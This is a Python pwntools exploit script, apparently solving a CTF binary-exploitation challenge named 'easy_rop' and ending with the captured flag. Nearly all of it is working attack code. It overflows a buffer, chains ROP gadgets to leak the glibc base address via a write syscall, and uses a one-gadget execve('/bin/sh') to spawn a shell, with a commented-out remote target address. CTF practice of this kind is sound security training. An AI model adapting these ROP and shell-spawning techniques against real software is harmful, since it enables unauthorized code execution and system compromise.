from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./easy_rop_patched', '''
    b *(main+32)
    continue
''')

# p = remote('74.207.229.59', 20222)

# 1. first ROP: move forward rsp to prepare for leak
GADGET_1 = 0x40101a  # ret;
MAIN = 0x401106
chain1 = [
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    GADGET_1,  # move forward rsp
    MAIN  # main in first ROP chain is used to read second ROP chain
]
p.send(b'A'*0x28+b''.join([p64(c1) for c1 in chain1]))  # payload for original main to read first ROP chain
pause()

# 2. second ROP: leak glibc base address
GADGET_2 = 0x40112e  # pop rdi; pop rbp; ret;
GADGET_3 = 0x401126  # syscall; pop rbp; ret;
FAKE_RBP = 0x404800
chain2 = [
    MAIN,  # first main in second ROP chain is used to read only one byte, returning 1 in rax, leaving rsi and rdx unchanged
    GADGET_2, 1, FAKE_RBP,  # let rdi be 1 as stdout
    GADGET_3, FAKE_RBP,  # with rax as 1, trigger write syscall to leak
    MAIN  # second main in second ROP chain is used to read third ROP chain
]
p.send(b'A'*0x28+b''.join([p64(c2) for c2 in chain2]))  # payload for main in first ROP chain to read second ROP chain
pause()
p.send(b'A')  # payload for first main in second ROP chain to read one byte leaving rax as 1
pause()
glibc_base_addr = u64(p.recv(0x80)[-8:].ljust(8, b'\x00'))-0x2a47b
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. third ROP: one gadget to pop a shell
# 0xf6237 execve("/bin/sh", rbp-0x50, r13)
# constraints:
#   address rbp-0x48 is writable
#   r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp
glibc_r = ROP('./libc.so.6')
chain3 = [
    glibc_base_addr+glibc_r.r12.address, 0,
    glibc_base_addr+glibc_r.r13.address, 0,
    glibc_base_addr+glibc_r.rbp.address, FAKE_RBP+0x48,
    glibc_base_addr+0xf6237
]
p.send(b'A'*0x28+b''.join([p64(c3) for c3 in chain3]))  # payload for second main in second ROP chain to read third ROP chain to pop a shell

p.interactive()

# texsaw{4sM_5t1lL_h45_l1bC_wh4t????}